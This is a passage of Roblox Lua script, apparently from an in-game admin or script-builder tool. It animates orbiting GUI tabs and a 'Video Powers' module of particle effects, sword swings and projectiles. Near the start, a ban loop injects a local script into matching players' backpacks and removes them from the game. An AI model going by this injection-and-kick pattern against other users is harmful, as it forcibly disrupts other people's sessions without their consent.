modeldebounce = false
end
end)
 
rot = 0
coroutine.resume(coroutine.create(function()
game:GetService("RunService").Stepped:connect(function()
if probemode == false then
if LocalPlayer.Character then
if LocalPlayer.Character:findFirstChild("Torso")  then
rot = rot + 0.0001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = LocalPlayer.Character.Torso.CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
rot = rot + 0.001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end)
end))
game:GetService("RunService").RenderStepped:connect(function()
    for _,a in pairs(game:service('Players'):children()) do
        for _,b in pairs(Banlist) do
                if b:find(a.Name) then
                         NewLS([==[
                        Instance.new('Message',Workspace).Text = "You are Banned." 
                         local p = game:GetService("Players").LocalPlayer
p.Parent=nil
wait()
p.Parent=game:GetService("Players")
                        ]==], a.Backpack)
                        a:remove()
            Output('Banned Player # '..a.Name..' # Attempted to join.',__)
else 
                end
        end
    end
end)
game.Players.ChildRemoved:connect(function(plr)
     Output("Disconnected: "..plr.Name)
wait(3)
Dismiss()
 end)

game.Players.ChildAdded:connect(function(plr)
     Output("Connected: "..plr.Name)
wait(3)
Dismiss()
 end)
end}
module[2] = {"Video Powers",function()
  plr = game.Players.LocalPlayer
  repeat
    wait(0.4)
  until plr.Character
  chr = plr.Character
  human = chr:FindFirstChild("Humanoid")
  mouse = plr:GetMouse()
  selected = false
  equipd = false
  tors = chr.Torso
  rarm = chr["Right Arm"]
  larm = chr["Left Arm"]
  rleg = chr["Right Leg"]
  lleg = chr["Left Leg"]
  hrp = chr.HumanoidRootPart
  head = chr.Head
  anim = human.Animator
  activu = false
  torrent = false
  boxingu = false
  Heartbeat = Instance.new("BindableEvent")
  Heartbeat.Name = "Heartbeat"
  Heartbeat.Parent = script
  frame = 0.03333333333333333
  tf = 0
  game:GetService("RunService").Heartbeat:connect(function(s, p)
    tf = tf + s
    if tf >= frame then
      for i = 1, math.floor(tf / frame) do
        Heartbeat:Fire()
      end
      tf = tf - frame * math.floor(tf / frame)
    end
  end)
  function swait(num)
    if num == 0 or num == nil then
      Heartbeat.Event:wait()
    else
      for i = 1, num do
        Heartbeat.Event:wait()
      end
    end
  end
  tool = Instance.new("Tool")
  tool.CanBeDropped = false
  tool.RequiresHandle = false
  tool.TextureId = "rbxassetid://37338767"
  tool.ToolTip = "hehe yea boi"
  tool.Name = "fir"
  tool.Parent = plr.Backpack
  modz = Instance.new("Model")
  modz.Name = "memes"
  modz.Parent = chr
  RSC0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
  RSC1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
  LSC0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
  LSC1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
  RHC0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
  RHC1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
  LHC0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
  LHC1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
  NC0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
  NC1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
  RJC0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
  RJC1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
  RS = tors:FindFirstChild("Right Shoulder")
  LS = tors:FindFirstChild("Left Shoulder")
  RH = tors:FindFirstChild("Right Hip")
  LH = tors:FindFirstChild("Left Hip")
  RJ = hrp:FindFirstChild("RootJoint")
  N = tors:FindFirstChild("Neck")
  cf = CFrame.new
  ang = CFrame.Angles
  rd = math.rad
  rd2 = math.random
  function nooutline(p)
    p.TopSurface, p.BottomSurface, p.LeftSurface, p.RightSurface, p.FrontSurface, p.BottomSurface = 10, 10, 10, 10, 10, 10
  end
  function makepart(color, name, reflec, mater, parnt, cfram)
    local port = Instance.new("Part")
    port.BrickColor = BrickColor.new(color)
    port.Name = name
    port.Transparency = 1
    nooutline(port)
    port.Reflectance = reflec
    port.Material = mater
    port.Anchored = false
    port.CanCollide = false
    port.Locked = true
    port.Size = Vector3.new(0.2, 0.2, 0.2)
    port.Parent = parnt
    return port
  end
  function makemesh(meshtype, scale, meshid, parent)
    local mes = Instance.new("SpecialMesh")
    mes.MeshType = meshtype
    mes.Scale = scale
    if meshtype == "FileMesh" then
      mes.MeshId = meshid
    end
    mes.Parent = parent
    return mes
  end
  function makeweld(parent, p0, p1, c0, c1)
    local wel = Instance.new("Weld")
    wel.Part0 = p0
    wel.Part1 = p1
    wel.C0 = c0
    if c1 ~= nil then
      wel.C1 = c1
    end
    wel.Parent = parent
    return wel
  end
  function vidp(prnt)
    local s = Instance.new("ParticleEmitter")
    s.Enabled = false
    s.LockedToPart = true
    s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
    s.LightEmission = 0.6
    s.Size = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0.275, 0),
      NumberSequenceKeypoint.new(0.406, 0.762, 0),
      NumberSequenceKeypoint.new(0.433, 2.05, 0.75),
      NumberSequenceKeypoint.new(0.476, 0.625, 0),
      NumberSequenceKeypoint.new(1, 0.05, 0)
    })
    s.Texture = "rbxassetid://31270182"
    s.Transparency = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0.6, 0),
      NumberSequenceKeypoint.new(0.89, 0.6, 0),
      NumberSequenceKeypoint.new(1, 1, 0)
    })
    s.Name = "vid"
    s.Lifetime = NumberRange.new(0.2)
    s.Rate = 25
    s.Speed = NumberRange.new(7, 10)
    s.VelocitySpread = 360
    s.Parent = prnt
    local s2 = Instance.new("ParticleEmitter")
    s2.Enabled = false
    s2.LockedToPart = false
    s2.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
    s2.LightEmission = 0.6
    s2.Size = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0, 0),
      NumberSequenceKeypoint.new(0.853, 0.125, 0.1),
      NumberSequenceKeypoint.new(1, 0, 0)
    })
    s2.Texture = "rbxassetid://31270182"
    s2.Transparency = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0.6, 0),
      NumberSequenceKeypoint.new(0.89, 0.6, 0),
      NumberSequenceKeypoint.new(1, 1, 0)
    })
    s2.Name = "vid2"
    s2.Lifetime = NumberRange.new(0.5)
    s2.Rate = 150
    s2.Speed = NumberRange.new(2, 6)
    s2.VelocitySpread = 360
    s2.Parent = prnt
  end
  function glow(tz, paz, length)
    if tz.Parent:FindFirstChildOfClass("Humanoid") and paz.Transparency == 1 then
      do
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://221727606"
        s.Volume = 0.25
        s.Pitch = math.random(9, 11) / 10
        s.Parent = paz
        s:Play()
        local hmesh = Instance.new("SpecialMesh")
        hmesh.MeshType = "FileMesh"
        hmesh.MeshId = "NOSSIN"
        hmesh.Parent = paz.Parent
        paz.Transparency = 0.55
        paz.vid.Enabled = true
        paz.vid2.Enabled = true
        delay(length, function()
          paz.Transparency = 1
          paz.vid.Enabled = false
          paz.vid2.Enabled = false
          hmesh:Destroy()
          s:Destroy()
        end)
      end
    end
  end
  function makeglow()
    for _, p in pairs(chr:GetChildren()) do
      if p.ClassName == "Accessory" then
        do
          local h = p:FindFirstChildOfClass("Part")
          local nh = h:Clone()
          for _, n in ipairs(nh:GetChildren()) do
            if n.ClassName == "Attachment" or n.ClassName == "Motor6D" then
              n:Destroy()
            end
          end
          nooutline(nh)
          nh.Parent = nil
          nh.CFrame = h.CFrame
          nh.Transparency = 1
          nh.Name = "Glow"
          nh.Material = "Neon"
          nh.BrickColor = BrickColor.new("Teal")
          nh.CustomPhysicalProperties = PhysicalProperties.new(0.2, 0.3, 0.5)
          nh.CanCollide = false
          nh.Parent = h
          makeweld(nh, nh, h, cf(0, 0, 0))
          local m = nh:FindFirstChildOfClass("SpecialMesh")
          m.Scale = m.Scale + Vector3.new(0.06, 0.06, 0.06)
          m.TextureId = ""
          vidp(nh)
          nh.Touched:connect(function(po)
            glow(po, nh, 0.8)
          end)
        end
      elseif p.ClassName == "Part" and p ~= hrp then
        do
          local n = p:Clone()
          for _, m in ipairs(n:GetChildren()) do
            if m.ClassName == "Attachment" or m.ClassName == "Motor6D" then
              m:Destroy()
            end
          end
          nooutline(n)
          n.Parent = nil
          n.Transparency = 1
          n.Material = "Neon"
          n.Name = "Glow"
          n.BrickColor = BrickColor.new("Teal")
          n.CFrame = p.CFrame
          n.CustomPhysicalProperties = PhysicalProperties.new(0.2, 0.3, 0.5)
          n.CanCollide = false
          n.Parent = p
          makeweld(n, n, p, cf(0, 0, 0))
          vidp(n)
          n.Touched:connect(function(po)
            glow(po, n, 0.8)
          end)
          if n:FindFirstChildOfClass("Decal") then
            n:FindFirstChildOfClass("Decal"):Destroy()
          end
          if p:FindFirstChildOfClass("SpecialMesh") then
            local c = p:FindFirstChildOfClass("SpecialMesh"):Clone()
            c.Parent = nil
            c.Scale = c.Scale + Vector3.new(0.05, 0.05, 0.05)
            c.Parent = n
          else
            local m = Instance.new("BlockMesh")
            m.Scale = Vector3.new(1.05, 1.025, 1.05)
            if p == tors then
              m.Scale = Vector3.new(1.05, 1.05, 1.05)
            end
            m.Parent = n
          end
        end
      end
    end
  end
  makeglow()
  function lerpz(joint, prop, cfrmz, alp)
    joint[prop] = joint[prop]:lerp(cfrmz, alp)
  end
  lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
  function resetlerp()
    RJ.C0 = RJC0
    RJ.C1 = RJC1
    N.C0 = NC0
    N.C1 = NC1
    RS.C0 = RSC0
    RS.C1 = RSC1
    LS.C0 = LSC0
    LS.C1 = LSC1
    RH.C0 = RHC0
    RH.C1 = RHC1
    LH.C0 = LHC0
  end
  local ign = {chr}
  function proj(cframe)
    coroutine.resume(coroutine.create(function()
      local mis = Instance.new("Part")
      mis.Anchored = true
      mis.CanCollide = false
      mis.Size = Vector3.new(1, 1, 1)
      mis.Transparency = 1
      mis.Name = "pew"
      mis.CFrame = cframe
      mis.Parent = workspace
      local s = Instance.new("ParticleEmitter")
      s.Enabled = true
      s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
      s.LightEmission = 0.6
      s.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.4, 0),
        NumberSequenceKeypoint.new(0.0241, 0.0625, 0),
        NumberSequenceKeypoint.new(0.0299, 0.66, 0.22),
        NumberSequenceKeypoint.new(0.0344, 0.0225, 0),
        NumberSequenceKeypoint.new(1, 0, 0)
      })
      s.Texture = "rbxassetid://31270182"
      s.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.6, 0),
        NumberSequenceKeypoint.new(0.89, 0.6, 0),
        NumberSequenceKeypoint.new(1, 1, 0)
      })
      s.Name = "vid"
      s.Lifetime = NumberRange.new(1)
      s.ZOffset = 0
      s.Rate = 3000
      s.Speed = NumberRange.new(25, 50)
      s.VelocitySpread = 20
      s.EmissionDirection = "Back"
      s.Parent = mis
      game.Debris:AddItem(mis, 10)
      table.insert(ign, mis)
      local wat = 0
      local derp = false
      local v = Instance.new("Sound")
      v.SoundId = "rbxassetid://221727606"
      v.Volume = 0.5
      v.Looped = true
      v.EmitterSize = 15
      v.MaxDistance = 40
      v.Pitch = math.random(12, 13) / 10
      v.Parent = mis
      v:Play()
      repeat
        swait()
        wat = wat + 1
        local ry = Ray.new(mis.Position, mis.CFrame.lookVector * 8)
        local prt, pos = workspace:FindPartOnRayWithIgnoreList(ry, ign, false, true)
        if prt and pos and 1 > prt.Transparency then
          derp = true
          mis.CFrame = CFrame.new(pos)
          v:Stop()
          s.Enabled = false
          s.Speed = NumberRange.new(15, 25)
          s.Lifetime = NumberRange.new(5)
          s.VelocitySpread = 360
          s:Emit(40)
          local n = Instance.new("Sound")
          n.Volume = 0.75
          n.Pitch = rd2(9, 11) / 10
          n.SoundId = "rbxassetid://184374162"
          n.Parent = mis
          n:Play()
          hito(mis, 300, 500000, 0.01)
        else
          mis.CFrame = mis.CFrame * CFrame.new(0, 0, -5)
        end
      until wat == 50 or derp == true
      if wat == 50 then
        mis:Destroy()
      end
      if derp == true then
        game.Debris:AddItem(mis, 1)
      end
    end))
  end
  function makesword(swocfrm, weldp1, cframe0)
    local ay = function(name, size, parnt, cfram)
      local port = Instance.new("Part")
      port.BrickColor = BrickColor.new("Teal")
      port.Name = name
      port.Transparency = 1
      nooutline(port)
      port.Material = "Neon"
      port.Anchored = false
      port.CanCollide = false
      port.Locked = true
      port.Size = size
      port.Parent = parnt
      return port
    end
    local swordmo = Instance.new("Model")
    swordmo.Name = "swod"
    swordmo.Parent = modz
    local booval = Instance.new("BoolValue")
    booval.Value = true
    booval.Name = "mememem"
    booval.Parent = swordmo
    local function pr(par, amt, sped)
      local s = Instance.new("ParticleEmitter")
      s.Enabled = false
      s.LockedToPart = true
      s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
      s.LightEmission = 0.6
      s.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.15, 0),
        NumberSequenceKeypoint.new(0.05, 0.3, 0.3),
        NumberSequenceKeypoint.new(0.1, 0.15, 0),
        NumberSequenceKeypoint.new(0.8, 0.2, 0),
        NumberSequenceKeypoint.new(1, 0, 0)
      })
      s.Texture = "rbxassetid://31270182"
      s.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.7, 0),
        NumberSequenceKeypoint.new(0.89, 0.7, 0),
        NumberSequenceKeypoint.new(1, 1, 0)
      })
      s.Name = "vid"
      s.Lifetime = NumberRange.new(0.75)
      s.Rate = 1
      s.Speed = sped
      s.VelocitySpread = 3
      s.Parent = par
      coroutine.resume(coroutine.create(function()
        while booval.Value do
          swait()
          s:Emit(amt)
        end
      end))
      return s
    end
    local ping = function(derp)
      local s3 = Instance.new("ParticleEmitter")
      s3.Enabled = false
      s3.LockedToPart = false
      s3.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
      s3.LightEmission = 0.6
      s3.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.35, 0),
        NumberSequenceKeypoint.new(0.2, 0.25, 0.25),
        NumberSequenceKeypoint.new(0.4, 0.15, 0),
        NumberSequenceKeypoint.new(0.853, 0.25, 0.1),
        NumberSequenceKeypoint.new(1, 0, 0)
      })
      s3.Texture = "rbxassetid://31270182"
      s3.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.4, 0),
        NumberSequenceKeypoint.new(0.89, 0.6, 0),
        NumberSequenceKeypoint.new(1, 1, 0)
      })
      s3.Name = "vid3"
      s3.Lifetime = NumberRange.new(0.5)
      s3.Acceleration = Vector3.new(0, 5, 0)
      s3.Rate = 350
      s3.Speed = NumberRange.new(10, 15)
      s3.VelocitySpread = 360
      s3.Parent = derp
      swait()
      s3:Emit(120)
    end
    local b1 = ay("b1", Vector3.new(0.3, 2.5, 0.3), swordmo, swocfrm)
    local p1 = pr(b1, 5, NumberRange.new(0, 1))
    if weldp1 then
      local w1 = makeweld(b1, b1, weldp1, cframe0, nil)
    end
    local bla = Instance.new("Sound")
    bla.SoundId = "rbxassetid://61425219"
    bla.Volume = 0.75
    bla.Pitch = math.random(7, 9) / 10
    bla.Parent = b1
    bla:Play()
    local b2 = ay("b2", Vector3.new(0.6, 0.75, 0.4), swordmo, swocfrm)
    local p2 = pr(b2, 1, NumberRange.new(0, 1))
    local w2 = makeweld(b2, b2, b1, ang(rd(180), rd(0), rd(0)) * cf(0, 1.5, 0), nil)
    local b3 = ay("b3", Vector3.new(0.7, 0.75, 0.5), swordmo, swocfrm)
    local p3 = pr(b3, 1, NumberRange.new(0, 3))
    local w3 = makeweld(b3, b3, b1, ang(rd(180), rd(90), rd(0)) * cf(0, -1.5, 0), nil)
    local b4 = ay("b4", Vector3.new(0.3, 0.75, 0.3), swordmo, swocfrm)
    local p4 = pr(b4, 1, NumberRange.new(1, 2))
    local w4 = makeweld(b4, b4, b3, cf(0, -0.5, 0) * ang(rd(70), rd(0), rd(0)), nil)
    local b5 = ay("b5", Vector3.new(0.3, 0.75, 0.3), swordmo, swocfrm)
    local p5 = pr(b5, 1, NumberRange.new(1, 2))
    local w5 = makeweld(b5, b5, b3, cf(0, -0.5, 0) * ang(rd(290), rd(0), rd(0)), nil)
    local b6 = ay("b6", Vector3.new(0.3, 0.5, 0.3), swordmo, swocfrm)
    local p6 = pr(b6, 1, NumberRange.new(1, 2))
    local w6 = makeweld(b6, b6, b3, cf(0, -0.25, 0) * ang(rd(35), rd(0), rd(0)), nil)
    local b7 = ay("b7", Vector3.new(0.3, 0.5, 0.3), swordmo, swocfrm)
    local p7 = pr(b7, 1, NumberRange.new(1, 2))
    local w7 = makeweld(b7, b7, b3, cf(0, -0.25, 0) * ang(rd(325), rd(0), rd(0)), nil)
    local b8 = ay("b8", Vector3.new(0.5, 5.5, 0.2), swordmo, swocfrm)
    local p8 = pr(b8, 9, NumberRange.new(1, 3))
    local w8 = makeweld(b8, b8, b1, ang(rd(0), rd(0), rd(0)) * cf(0, -4, 0), nil)
    local anbo = Instance.new("Part")
    anbo.Anchored = true
    anbo.CanCollide = false
    anbo.Size = Vector3.new(2.5, 9, 1)
    anbo.CFrame = b8.CFrame * cf(0, -1.5, 0)
    anbo.Transparency = 1
    anbo.Parent = workspace
    game.Debris:AddItem(anbo, 2)
    ping(anbo)
    local whos = Instance.new("ParticleEmitter")
    whos.Enabled = false
    whos.LockedToPart = false
    whos.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
    whos.LightEmission = 0.6
    whos.Size = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0.15, 0),
      NumberSequenceKeypoint.new(0.05, 0.3, 0.3),
      NumberSequenceKeypoint.new(0.1, 0.15, 0),
      NumberSequenceKeypoint.new(0.8, 0.2, 0),
      NumberSequenceKeypoint.new(1, 0, 0)
    })
    whos.Texture = "rbxassetid://31270182"
    whos.Transparency = NumberSequence.new({
      NumberSequenceKeypoint.new(0, 0.7, 0),
      NumberSequenceKeypoint.new(0.89, 0.7, 0),
      NumberSequenceKeypoint.new(1, 1, 0)
    })
    whos.Name = "whoos"
    whos.Lifetime = NumberRange.new(0.75)
    whos.Rate = 2000
    whos.Speed = NumberRange.new(0)
    whos.VelocityInheritance = 0.8
    whos.VelocitySpread = 3
    whos.Parent = b8
    return swordmo
  end
  function removesword(swordmodel)
    swordmodel.mememem.Value = false
    local hn = swordmodel.b1
    hn.Anchored = true
    if hn:FindFirstChildOfClass("Weld") then
      hn:FindFirstChildOfClass("Weld"):Destroy()
    end
    local bla = Instance.new("Sound")
    bla.SoundId = "rbxassetid://192783601"
    bla.Volume = 1.25
    bla.Pitch = math.random(9, 10) / 10
    bla.Parent = hn
    bla:Play()
    local ping = function(derp)
      local s3 = Instance.new("ParticleEmitter")
      s3.Enabled = false
      s3.LockedToPart = false
      s3.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
      s3.LightEmission = 0.6
      s3.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.35, 0),
        NumberSequenceKeypoint.new(0.2, 0.25, 0.25),
        NumberSequenceKeypoint.new(0.4, 0.15, 0),
        NumberSequenceKeypoint.new(0.853, 0.25, 0.1),
        NumberSequenceKeypoint.new(1, 0, 0)
      })
      s3.Texture = "rbxassetid://31270182"
      s3.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.4, 0),
        NumberSequenceKeypoint.new(0.89, 0.6, 0),
        NumberSequenceKeypoint.new(1, 1, 0)
      })
      s3.Name = "vid3"
      s3.Lifetime = NumberRange.new(0.5)
      s3.Acceleration = Vector3.new(0, 5, 0)
      s3.Rate = 350
      s3.Speed = NumberRange.new(10, 15)
      s3.VelocitySpread = 360
      s3.Parent = derp
      swait()
      s3:Emit(180)
    end
    local anbo = Instance.new("Part")
    anbo.Anchored = true
    anbo.CanCollide = false
    anbo.Size = Vector3.new(2.5, 9, 1)
    anbo.CFrame = swordmodel.b8.CFrame * cf(0, -1.5, 0)
    anbo.Transparency = 1
    anbo.Parent = workspace
    game.Debris:AddItem(anbo, 2)
    ping(anbo)
    game.Debris:AddItem(swordmodel, 1.25)
  end
  function eswing()
    if activu == true or selected == false then
      return
    end
    activu = true
    local sw = makesword(hrp.CFrame, rarm, ang(rd(90), rd(0), rd(90)) * cf(0, 1, 0.5))
    animo(false)
    local hwel = sw.b1:FindFirstChildOfClass("Weld")
    local hwelc0 = hwel.C0
    local whoo = sw.b8:FindFirstChild("whoos")
    for _ = 1, 12 do
      swait()
      lerpz(RJ, "C0", RJC0 * cf(0, 0.75, 0) * ang(rd(0), rd(0), rd(-70)), 0.5)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(-6), rd(70)), 0.5)
      lerpz(N, "C1", NC1 * cf(0, 0, 0) * ang(rd(-13), rd(0), rd(0)), 0.5)
      lerpz(RS, "C0", RSC0 * cf(0.3, 0.25, 0.55) * ang(rd(-30), rd(-70), rd(15)), 0.5)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(60), rd(0)), 0.5)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(10), rd(5), rd(10)), 0.5)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.5)
      lerpz(RH, "C0", RHC0 * cf(0.45, 0.05, -0.15) * ang(rd(-5), rd(60), rd(0)), 0.5)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.5)
      lerpz(LH, "C0", LHC0 * cf(0.45, 0.05, -0.35) * ang(rd(-5), rd(75), rd(0)), 0.5)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.5)
      hwel.C0 = hwel.C0:lerp(cf(-0.25, 0.25, 0) * ang(rd(0), rd(0), rd(40)) * hwelc0, 0.5)
    end
    for c = 1, 3 do
      swait()
      lerpz(RJ, "C0", RJC0 * cf(0, -0.25, 0) * ang(rd(0), rd(0), rd(10)), 0.1 + c / 5)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(10), rd(0), rd(-10)), 0.1 + c / 5)
      lerpz(N, "C1", NC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.1 + c / 5)
      lerpz(RS, "C0", RSC0 * cf(-0.2, 0.35, 0.9) * ang(rd(-20), rd(170), rd(15)), 0.1 + c / 5)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.1 + c / 5)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(-20), rd(5), rd(10)), 0.1 + c / 5)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.1 + c / 5)
      lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(-5), rd(-10), rd(1)), 0.1 + c / 5)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.1 + c / 5)
      lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(-5), rd(10), rd(-1)), 0.1 + c / 5)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.1 + c / 5)
      hwel.C0 = hwel.C0:lerp(cf(-0.15, 0.15, 0) * ang(rd(0), rd(0), rd(10)) * hwelc0, 0.1 + c / 5)
    end
    whoo.Enabled = true
    for _ = 1, 14 do
      swait()
      hito(sw.b8, 3, 35, 0.8)
      lerpz(RJ, "C0", RJC0 * cf(0, -0.75, 0) * ang(rd(0), rd(0), rd(60)), 0.6)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(-5), rd(0), rd(-40)), 0.6)
      lerpz(N, "C1", NC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.6)
      lerpz(RS, "C0", RSC0 * cf(-0.1, 0.65, 0.9) * ang(rd(-15), rd(135), rd(-165)), 0.6)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.6)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(-30), rd(5), rd(10)), 0.6)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.6)
      lerpz(RH, "C0", RHC0 * cf(-0.25, 0, 0) * ang(rd(-5), rd(-50), rd(1)), 0.6)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.6)
      lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(-5), rd(10), rd(-1)), 0.6)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.6)
      hwel.C0 = hwel.C0:lerp(cf(-0.25, 0.25, 0) * ang(rd(0), rd(0), rd(40)) * hwelc0, 0.6)
    end
    whoo.Enabled = false
    removesword(sw)
    animo(true)
    for _ = 1, 10 do
      swait()
      lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
    end
    resetlerp()
    activu = false
  end
  function torentmod()
    if selected == false or activu == true then
      return
    end
    if torrent == false then
      torrent = true
      do
        local viarm = Instance.new("Part")
        nooutline(viarm)
        viarm.CanCollide = false
        viarm.Transparency = 1
        viarm.Name = "shootingu"
        viarm.Size = Vector3.new(1.25, 1, 1.25)
        viarm.CFrame = rarm.CFrame
        viarm.Parent = modz
        makeweld(viarm, viarm, rarm, cf(0, 1, 0))
        s = Instance.new("ParticleEmitter")
        s.Enabled = true
        s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
        s.LightEmission = 0.6
        s.Size = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0, 0),
          NumberSequenceKeypoint.new(0.0241, 0.0925, 0),
          NumberSequenceKeypoint.new(0.0299, 0.56, 0.25),
          NumberSequenceKeypoint.new(0.0344, 0.0925, 0),
